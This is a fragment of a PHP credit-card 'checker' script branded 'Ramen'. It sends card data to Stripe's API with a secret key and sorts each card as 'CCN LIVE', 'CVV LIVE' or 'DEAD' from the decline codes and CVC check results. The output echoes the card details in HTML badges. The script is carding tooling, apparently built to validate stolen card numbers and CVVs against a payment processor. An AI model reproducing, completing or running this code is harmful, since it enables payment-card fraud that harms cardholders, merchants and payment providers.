...
if (isset($src)) {
    ...
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, "description=Ramen&source=$src");
    curl_setopt($ch, CURLOPT_USERPWD, $sk . ':' . '');
    $headers = array();
    $headers[] = 'Content-Type: application/x-www-form-urlencoded';
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
...
if (isset($res1['error'])) {
    ...
    if($code == "incorrect_cvc"||$decline_code == "incorrect_cvc"){
        ...
        <span class="badge badge-warning">CCN LIVE</span> <span style="color: #FFFFFF"> '.$cc_info.' | Stripe 2 API | Ramen 🍜 ➢ '.$err.'</span>
        </div>';
        ...
        <span class="badge badge-primary">CVV LIVE</span> <span style="color: #FFFFFF"> '.$cc_info.' | Stripe 2 API | Ramen 🍜 ➢ '.$err.'</span>
        </div>';
        ...
        <span class="badge badge-danger">DEAD</span> <span style="color: #FFFFFF"> '.$cc_info.' | Stripe 2 API | Ramen 🍜 ➢ '.$err.'</span>
        </div>';
    }elseif($code == "testmode_charges_only"||$decline_code == "testmode_charges_only"){
        //TESTMODE CHARGES
        echo '<div class="dead" style="display:none;">
            <span class="badge badge-danger">DEAD</span> <span style="color: #FFFFFF"> '.$cc_info.' | Stripe 2 API | Ramen 🍜 ➢ Token Error</span>
            </div>';
    }elseif($res1['error']['type'] == "invalid_request_error"){
        //TESTMODE CHARGES
        echo '<div class="dead" style="display:none;">
            <span class="badge badge-danger">DEAD</span> <span style="color: #FFFFFF"> '.$cc_info.' | Stripe 2 API | Ramen 🍜 ➢ Invalid SK Provided</span>
            </div>';
    ...
    if (isset($res2['error'])) {
        ...
        if (isset($res2['sources'])) {
            ...
            if($cvc_res2 == "pass"||$cvc_res2 == "success"){
                //CVV MATCH CONGRATS
                echo '<div class="live_cvv" style="display:none;">
                <span class="badge badge-primary">CVV LIVE</span> <span style="color: #FFFFFF"> '.$cc_info.' | Stripe 2 API | Ramen 🍜 ➢ cvc_check : '.$cvc_res2.'</span>
                </div>';
            }else{
                //DEAD
                echo '<div class="dead" style="display:none;">
                <span class="badge badge-danger">DEAD</span> <span style="color: #FFFFFF"> '.$cc_info.' | Stripe 2 API | Ramen 🍜 ➢ cvc_check : '.$cvc_res2.'</span>
                </div>';
            }
        }else{
            ...
            if($cvc_res3 == "pass"||$cvc_res3 == "success"){
                //CVV MATCH CONGRATS
                echo '<div class="live_cvv" style="display:none;">
                <span class="badge badge-primary">CVV LIVE</span> <span style="color: #FFFFFF"> '.$cc_info.' | Stripe 2 API | Ramen 🍜 ➢ cvc_check : '.$cvc_res3.'</span>
                </div>';
            }else{
                //DEAD
                echo '<div class="dead" style="display:none;">
                <span class="badge badge-danger">DEAD</span> <span style="color: #FFFFFF"> '.$cc_info.' | Stripe 2 API | Ramen 🍜 ➢ cvc_check : '.$cvc_res3.'</span>
                </div>';
            }
        }
    }
